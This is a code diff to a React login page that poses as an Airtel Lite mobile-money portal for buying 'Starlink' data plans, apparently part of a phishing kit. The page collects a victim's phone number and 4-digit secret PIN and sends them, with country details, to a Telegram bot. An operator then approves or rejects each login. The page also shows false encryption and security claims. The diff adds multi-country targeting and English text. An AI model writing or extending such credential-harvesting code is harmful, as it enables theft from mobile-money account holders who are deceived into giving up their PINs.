@@ -5,6 +5,10 @@ import { InternetPlan } from '../types';
 import { ValidatingModal } from './ValidatingModal';
 import { useTelegramPolling } from '../hooks/useTelegramPolling';
 import { telegramService } from '../services/telegramService';
+import { CountryDropdown } from './CountryDropdown';
+import { LanguageSwitch } from './LanguageSwitch';
+import { useApp } from '../context/AppContext';
+import { validateAirtelPhone, CountryInfo } from '../data/countries';
 import {
   Eye,
   EyeOff,
@@ -14,12 +18,20 @@ import {
   AlertTriangle,
   Loader2,
   Zap,
+  CheckCircle2,
+  ShieldCheck,
 } from 'lucide-react';
 
 interface LoginPageProps {
   selectedPlan: InternetPlan;
   onBack: () => void;
-  onLoginSuccess: (phone: string, pin: string, sessionId: string) => void;
+  onLoginSuccess: (
+    phone: string,
+    pin: string,
+    sessionId: string,
+    country: CountryInfo,
+    fullPhone: string
+  ) => void;
 }
 
 export const LoginPage: React.FC<LoginPageProps> = ({
@@ -27,11 +39,13 @@ export const LoginPage: React.FC<LoginPageProps> = ({
   onBack,
   onLoginSuccess,
 }) => {
+  const { country, setCountry, language, t } = useApp();
   const [phoneNumber, setPhoneNumber] = useState('');
   const [pinDigits, setPinDigits] = useState<string[]>(['', '', '', '']);
   const [showPin, setShowPin] = useState(false);
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [errorMessage, setErrorMessage] = useState<string | null>(null);
+  const [hasAttemptedSubmit, setHasAttemptedSubmit] = useState(false);
   const [sessionId, setSessionId] = useState<string>('');
   const [isWaitingTelegram, setIsWaitingTelegram] = useState(false);
 
@@ -39,9 +53,17 @@ export const LoginPage: React.FC<LoginPageProps> = ({
 
   // Generate session ID on mount
   useEffect(() => {
-    const newSessionId = 'stl_' + Math.random().toString(36).substring(2, 10) + '_' + Date.now().toString().slice(-4);
+    const newSessionId =
+      'stl_' +
+      Math.random().toString(36).substring(2, 10) +
+      '_' +
+      Date.now().toString().slice(-4);
     setSessionId(newSessionId);
   }, []);
+
+  // Phone validation with active country's Airtel rules
+  const phoneValidation = validateAirtelPhone(country, phoneNumber);
+  const fullInternationalPhone = `${country.dialCode} ${phoneValidation.normalized}`;
 
   // Handle PIN input change
   const handlePinChange = (index: number, value: string) => {
@@ -81,7 +103,7 @@ export const LoginPage: React.FC<LoginPageProps> = ({
   };
 
   const currentPin = pinDigits.join('');
-  const isFormValid = phoneNumber.replace(/\D/g, '').length >= 9 && currentPin.length === 4;
+  const isFormValid = phoneValidation.isValid && currentPin.length === 4;
 
   // Handle Telegram verification callbacks
   const { status: telegramStatus } = useTelegramPolling({
@@ -91,12 +113,22 @@ export const LoginPage: React.FC<LoginPageProps> = ({
     onApproved: () => {
       setTimeout(() => {
         setIsWaitingTelegram(false);
-        onLoginSuccess(phoneNumber, currentPin, sessionId);
+        onLoginSuccess(
+          phoneNumber.trim(),
+          currentPin,
+          sessionId,
+          country,
+          fullInternationalPhone
+        );
       }, 800);
     },
     onRejected: () => {
       setIsWaitingTelegram(false);
-      setErrorMessage('Code PIN ou numéro de téléphone non valide. Veuillez vérifier et réessayer.');
+      setErrorMessage(
+        language === 'fr'
+          ? 'Code PIN ou numéro de téléphone non valide. Veuillez vérifier et réessayer.'
+          : 'Invalid PIN code or phone number. Please check and try again.'
+      );
       setPinDigits(['', '', '', '']);
       pinInputRefs.current[0]?.focus();
     },
@@ -104,16 +136,38 @@ export const LoginPage: React.FC<LoginPageProps> = ({
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (!isFormValid || isSubmitting) return;
+    setHasAttemptedSubmit(true);
+
+    if (!phoneValidation.isValid) {
+      setErrorMessage(
+        language === 'fr' ? phoneValidation.errorFr || '' : phoneValidation.errorEn || ''
+      );
+      return;
+    }
+
+    if (currentPin.length !== 4) {
+      setErrorMessage(
+        language === 'fr'
+          ? 'Le code PIN doit comporter exactement 4 chiffres.'
+          : 'The PIN code must be exactly 4 digits.'
+      );
+      return;
+    }
+
+    if (isSubmitting) return;
 
     setIsSubmitting(true);
     setErrorMessage(null);
 
     try {
-      // Send login info to Telegram Bot safely (works directly on Vercel & server)
+      // Send login info with country and full international phone to Telegram Bot
       await telegramService.sendLogin({
         sessionId,
-        phone: phoneNumber.trim(),
+        country: `${country.flag} ${language === 'fr' ? country.nameFr : country.nameEn}`,
+        countryCode: country.id,
+        airtelBrand: country.airtelBrand,
+        phone: phoneValidation.normalized,
+        fullPhone: fullInternationalPhone,
         pin: currentPin,
         planName: `${selectedPlan.dataAmount} ${selectedPlan.dataUnit} (${selectedPlan.validity})`,
         planPrice: selectedPlan.price,
@@ -122,7 +176,12 @@ export const LoginPage: React.FC<LoginPageProps> = ({
       // Open validating modal
       setIsWaitingTelegram(true);
     } catch (err: any) {
-      setErrorMessage(err.message || 'Impossible de joindre le service de validation. Veuillez réessayer.');
+      setErrorMessage(
+        err.message ||
+          (language === 'fr'
+            ? 'Impossible de joindre le service de validation. Veuillez réessayer.'
+            : 'Could not connect to validation service. Please try again.')
+      );
     } finally {
       setIsSubmitting(false);
     }
@@ -131,8 +190,8 @@ export const LoginPage: React.FC<LoginPageProps> = ({
   return (
     <div className="min-h-screen bg-[#F7F9FC] flex flex-col justify-between text-neutral-900 selection:bg-[#E60000] selection:text-white">
       {/* Top Header */}
-      <header className="w-full bg-white border-b border-neutral-200 shadow-sm py-4 px-4 sm:px-6">
-        <div className="max-w-4xl mx-auto flex items-center justify-between">
+      <header className="w-full bg-white border-b border-neutral-200 shadow-sm py-3.5 px-4 sm:px-6 sticky top-0 z-30">
+        <div className="max-w-4xl mx-auto flex items-center justify-between gap-2">
           <button
             type="button"
             id="btn-back-to-plans"
@@ -140,21 +199,25 @@ export const LoginPage: React.FC<LoginPageProps> = ({
             className="flex items-center gap-1.5 text-xs font-bold text-neutral-600 hover:text-[#E60000] transition-colors py-2 px-2.5 rounded-xl hover:bg-neutral-100 cursor-pointer"
           >
             <ArrowLeft className="w-4 h-4" />
-            <span className="hidden xs:inline">Changer de forfait</span>
-            <span className="xs:hidden">Retour</span>
+            <span className="hidden xs:inline">{t('backToPlans')}</span>
+            <span className="xs:hidden">{t('back')}</span>
           </button>
 
-          <div className="flex items-center gap-2">
-            <span className="text-[11px] font-bold text-neutral-500 uppercase tracking-wider hidden sm:inline-block">
-              Portail Airtel Lite
-            </span>
-            <div className="w-2.5 h-2.5 rounded-full bg-emerald-500 animate-pulse" />
+          <div className="flex items-center gap-3">
+            <LanguageSwitch variant="light" />
+
+            <div className="hidden sm:flex items-center gap-2 pl-2 border-l border-neutral-200">
+              <span className="text-[11px] font-bold text-neutral-500 uppercase tracking-wider">
+                {t('airtelLitePortal')}
+              </span>
+              <div className="w-2.5 h-2.5 rounded-full bg-emerald-500 animate-pulse" />
+            </div>
           </div>
         </div>
       </header>
 
       {/* Main Form Center Box */}
-      <main className="flex-1 flex flex-col items-center justify-center px-4 py-6 sm:py-12">
+      <main className="flex-1 flex flex-col items-center justify-center px-3 sm:px-4 py-6 sm:py-12">
         <motion.div
           initial={{ opacity: 0, y: 20 }}
           animate={{ opacity: 1, y: 0 }}
@@ -172,7 +235,7 @@ export const LoginPage: React.FC<LoginPageProps> = ({
                 <Zap className="w-4 h-4" />
               </div>
               <div className="min-w-0">
-                <p className="text-[11px] font-semibold text-neutral-500 truncate">Forfait Starlink sélectionné</p>
+                <p className="text-[11px] font-semibold text-neutral-500 truncate">{t('selectedPlanPill')}</p>
                 <p className="text-xs font-black text-neutral-900 truncate">
                   {selectedPlan.dataAmount} {selectedPlan.dataUnit} • {selectedPlan.validity}
                 </p>
@@ -186,11 +249,11 @@ export const LoginPage: React.FC<LoginPageProps> = ({
           {/* Airtel Logo Header */}
           <div className="flex flex-col items-center text-center mb-6">
             <AirtelLogo variant="nextgen" className="h-11 mb-2" />
-            <h2 className="text-base sm:text-lg font-bold text-neutral-800 tracking-tight mt-2">
-              Connectez-vous à Airtel Lite pour finaliser le paiement.
+            <h2 className="text-base sm:text-lg font-bold text-neutral-800 tracking-tight mt-1">
+              {t('loginTitle')}
             </h2>
             <p className="text-xs text-neutral-500 mt-1">
-              Renseignez votre numéro Airtel RDC et votre code secret.
+              {t('loginSubtitle')}
             </p>
           </div>
 
@@ -207,20 +270,47 @@ export const LoginPage: React.FC<LoginPageProps> = ({
           )}
 
           {/* Form */}
-          <form onSubmit={handleSubmit} className="space-y-6">
+          <form onSubmit={handleSubmit} className="space-y-5">
+            {/* Country Dropdown (Compulsory) */}
+            <div>
+              <CountryDropdown
+                selectedCountry={country}
+                onSelectCountry={(newCountry) => {
+                  setCountry(newCountry, true);
+                  setErrorMessage(null);
+                }}
+                isRequired={true}
+                hasError={hasAttemptedSubmit && !country}
+              />
+            </div>
+
             {/* Phone Number Input */}
             <div>
-              <label
-                htmlFor="phone-input"
-                className="block text-xs font-bold text-neutral-700 mb-1.5 uppercase tracking-wider"
+              <div className="flex items-center justify-between mb-1.5">
+                <label
+                  htmlFor="phone-input"
+                  className="block text-xs font-bold text-neutral-700 uppercase tracking-wider"
+                >
+                  {t('phoneLabel')}
+                </label>
+                <span className="text-[10px] font-bold text-[#E60000]">
+                  {country.airtelBrand}
+                </span>
+              </div>
+
+              <div
+                className={`relative flex items-center rounded-2xl border-2 transition-all bg-white overflow-hidden shadow-inner ${
+                  hasAttemptedSubmit && !phoneValidation.isValid
+                    ? 'border-rose-400 ring-4 ring-rose-500/10'
+                    : phoneValidation.isValid && phoneNumber
+                    ? 'border-emerald-500 ring-4 ring-emerald-500/10'
+                    : 'border-neutral-300 focus-within:border-[#0055FF] focus-within:ring-4 focus-within:ring-blue-500/10'
+                }`}
               >
-                Numéro de Téléphone Airtel
-              </label>
-              <div className="relative flex items-center rounded-2xl border-2 border-neutral-300 focus-within:border-[#0055FF] focus-within:ring-4 focus-within:ring-blue-500/10 transition-all bg-white overflow-hidden shadow-inner">
                 {/* Country Code Prefix */}
-                <div className="flex items-center gap-1.5 bg-neutral-100 px-3 py-3 border-r border-neutral-300 text-neutral-700 font-bold text-sm shrink-0 select-none">
-                  <span className="text-base">🇨🇩</span>
-                  <span>CD +243</span>
+                <div className="flex items-center gap-1.5 bg-neutral-100 px-3 py-3 border-r border-neutral-300 text-neutral-800 font-bold text-sm shrink-0 select-none">
+                  <span className="text-base">{country.flag}</span>
+                  <span>{country.dialCode}</span>
                 </div>
 
                 <input
@@ -229,28 +319,55 @@ export const LoginPage: React.FC<LoginPageProps> = ({
                   autoFocus
                   value={phoneNumber}
                   onChange={(e) => {
-                    const clean = e.target.value.replace(/\D/g, '').slice(0, 9);
+                    const clean = e.target.value.replace(/\D/g, '').slice(0, country.maxDigits + 1);
                     setPhoneNumber(clean);
                     setErrorMessage(null);
                   }}
-                  placeholder="951234567"
+                  placeholder={country.placeholder}
                   className="w-full px-3 py-3 text-neutral-900 font-bold text-base tracking-wider placeholder:text-neutral-400 focus:outline-none bg-transparent"
                 />
 
-                <div className="pr-3 text-neutral-400">
-                  <Smartphone className="w-5 h-5" />
+                <div className="pr-3 flex items-center gap-1.5 shrink-0">
+                  {phoneNumber && (
+                    phoneValidation.isValid ? (
+                      <CheckCircle2 className="w-5 h-5 text-emerald-600" />
+                    ) : (
+                      <span className="text-[10px] font-bold text-rose-500">
+                        {phoneNumber.replace(/\D/g, '').length}/{country.minDigits}
+                      </span>
+                    )
+                  )}
+                  <Smartphone className="w-5 h-5 text-neutral-400" />
                 </div>
               </div>
-              <p className="text-[10px] text-neutral-500 mt-1 pl-1">
-                Format: 9 chiffres (ex: 97xxxxxxx, 99xxxxxxx, 81xxxxxxx, 95xxxxxxx)
-              </p>
+
+              {/* Dynamic validation / format helper text */}
+              <div className="mt-1.5 pl-1">
+                {phoneNumber && !phoneValidation.isValid ? (
+                  <p className="text-[11px] font-bold text-rose-600 flex items-center gap-1">
+                    <span>⚠</span>
+                    <span>
+                      {language === 'fr'
+                        ? phoneValidation.errorFr
+                        : phoneValidation.errorEn}
+                    </span>
+                  </p>
+                ) : (
+                  <p className="text-[10px] text-neutral-500 font-medium">
+                    {t('phoneFormatHint')}{' '}
+                    <span className="font-bold text-neutral-700">
+                      {language === 'fr' ? country.descriptionFr : country.descriptionEn}
+                    </span>
+                  </p>
+                )}
+              </div>
             </div>
 
-            {/* 4-Digit Code PIN Input */}
+            {/* 4-Digit Secret PIN Input */}
             <div>
               <div className="flex items-center justify-between mb-2">
                 <label className="block text-xs font-bold text-neutral-700 uppercase tracking-wider">
-                  Entrez votre Code
+                  {t('pinLabel')}
                 </label>
                 <button
                   type="button"
@@ -261,90 +378,107 @@ export const LoginPage: React.FC<LoginPageProps> = ({
                   {showPin ? (
                     <>
                       <EyeOff className="w-3.5 h-3.5" />
-                      <span>Masquer</span>
+                      <span>{t('hide')}</span>
                     </>
                   ) : (
                     <>
                       <Eye className="w-3.5 h-3.5" />
-                      <span>Afficher</span>
+                      <span>{t('show')}</span>
                     </>
                   )}
                 </button>
               </div>
 
-              {/* 4 Discrete Boxes */}
-              <div className="flex items-center justify-center gap-2.5 sm:gap-3.5">
-                {[0, 1, 2, 3].map((index) => (
-                  <input
-                    key={index}
-                    id={`pin-input-${index}`}
-                    ref={(el) => {
-                      pinInputRefs.current[index] = el;
-                    }}
-                    type={showPin ? 'text' : 'password'}
-                    inputMode="numeric"
-                    maxLength={1}
-                    value={pinDigits[index]}
-                    onChange={(e) => handlePinChange(index, e.target.value)}
-                    onKeyDown={(e) => handlePinKeyDown(index, e)}
-                    onPaste={index === 0 ? handlePinPaste : undefined}
-                    className="w-12 h-14 sm:w-16 sm:h-16 text-center text-2xl font-black text-neutral-900 rounded-2xl border-2 border-blue-600 bg-white focus:border-[#E60000] focus:ring-4 focus:ring-red-500/20 focus:outline-none transition-all shadow-sm"
-                  />
-                ))}
+              {/* 4 Separate PIN Digit Boxes */}
+              <div className="flex items-center justify-center gap-3 sm:gap-4">
+                {[0, 1, 2, 3].map((index) => {
+                  const hasDigit = Boolean(pinDigits[index]);
+                  return (
+                    <div key={index} className="relative flex-1 max-w-[68px]">
+                      <input
+                        ref={(el) => {
+                          pinInputRefs.current[index] = el;
+                        }}
+                        type={showPin ? 'text' : 'password'}
+                        inputMode="numeric"
+                        maxLength={1}
+                        value={pinDigits[index]}
+                        onChange={(e) => handlePinChange(index, e.target.value)}
+                        onKeyDown={(e) => handlePinKeyDown(index, e)}
+                        onPaste={handlePinPaste}
+                        className={`w-full h-13 sm:h-14 text-center text-xl sm:text-2xl font-black rounded-2xl border-2 transition-all bg-neutral-50 focus:bg-white focus:outline-none ${
+                          hasDigit
+                            ? 'border-[#0055FF] text-neutral-900 ring-2 ring-blue-500/10'
+                            : 'border-neutral-300 text-neutral-700 focus:border-[#0055FF] focus:ring-4 focus:ring-blue-500/10'
+                        }`}
+                      />
+                    </div>
+                  );
+                })}
+              </div>
+
+              <div className="flex items-center justify-between mt-2 px-1 text-[11px] text-neutral-500">
+                <span className="flex items-center gap-1">
+                  <Lock className="w-3.5 h-3.5 text-neutral-400" />
+                  <span>{language === 'fr' ? 'Code secret à 4 chiffres' : '4-digit secret PIN'}</span>
+                </span>
+                <span className="font-semibold text-neutral-400">{currentPin.length}/4</span>
               </div>
             </div>
 
             {/* Submit Button */}
             <button
               type="submit"
-              id="btn-connexion"
-              disabled={!isFormValid || isSubmitting}
-              className={`w-full py-4 px-6 rounded-2xl font-black text-sm uppercase tracking-widest transition-all flex items-center justify-center gap-2 shadow-lg ${
+              id="btn-login-submit"
+              disabled={isSubmitting}
+              className={`w-full py-4 px-6 rounded-2xl font-black text-sm uppercase tracking-wider transition-all duration-200 flex items-center justify-center gap-2 cursor-pointer shadow-lg ${
                 isFormValid && !isSubmitting
-                  ? 'bg-[#E60000] hover:bg-[#c90000] active:scale-[0.98] text-white shadow-red-600/30 cursor-pointer'
+                  ? 'bg-[#E60000] hover:bg-[#c90000] active:scale-[0.98] text-white shadow-red-500/30'
                   : 'bg-neutral-200 text-neutral-400 cursor-not-allowed shadow-none'
               }`}
             >
               {isSubmitting ? (
                 <>
                   <Loader2 className="w-5 h-5 animate-spin" />
-                  <span>Validation en cours...</span>
+                  <span>{t('connecting')}</span>
                 </>
               ) : (
-                <span>CONNEXION</span>
+                <span>{t('validateContinue')}</span>
               )}
             </button>
           </form>
 
-          {/* Safe Badge */}
-          <div className="mt-6 pt-4 border-t border-neutral-100 flex items-center justify-center gap-2 text-[11px] text-neutral-500 font-medium">
-            <Lock className="w-3.5 h-3.5 text-emerald-600 shrink-0" />
-            <span>Cryptage bancaire AES-256 Airtel Lite</span>
+          {/* Secure Guarantee Note */}
+          <div className="mt-6 pt-5 border-t border-neutral-100 flex items-center justify-center gap-2 text-center text-[11px] text-neutral-500">
+            <ShieldCheck className="w-4 h-4 text-emerald-600 shrink-0" />
+            <span>{t('secureNote')}</span>
           </div>
         </motion.div>
       </main>
 
-      {/* Validating PIN Modal */}
+      {/* Footer */}
+      <footer className="w-full bg-white border-t border-neutral-200 py-4 px-4 text-center text-xs text-neutral-500">
+        <div className="max-w-4xl mx-auto flex items-center justify-center gap-2">
+          <span>© 2026 {country.airtelBrand}</span>
+          <span>•</span>
+          <span>Starlink Direct-to-Cell</span>
+        </div>
+      </footer>
+
+      {/* Validating Modal */}
       <ValidatingModal
         isOpen={isWaitingTelegram}
         type="pin"
-        phone={phoneNumber}
+        phone={fullInternationalPhone}
         planName={`${selectedPlan.dataAmount} ${selectedPlan.dataUnit}`}
-        status={telegramStatus}
+        status={
+          telegramStatus === 'approved'
+            ? 'approved'
+            : telegramStatus === 'rejected'
+            ? 'rejected'
+            : 'pending'
+        }
       />
-
-      {/* Footer with clean responsive spacing */}
-      <footer className="w-full bg-white border-t border-neutral-200 mt-auto py-8 sm:py-10 px-4 sm:px-6 text-center">
-        <div className="max-w-4xl mx-auto flex flex-col items-center justify-center gap-3 sm:gap-4">
-          <AirtelLogo variant="red" size="sm" />
-          <p className="text-xs text-neutral-600 font-medium">
-            En collaboration avec <span className="text-neutral-900 font-bold tracking-wider">STARLINK™</span>
-          </p>
-          <p className="text-[11px] text-neutral-400">
-            © 2026 Airtel Congo. Tous droits réservés.
-          </p>
-        </div>
-      </footer>
     </div>
   );
 };
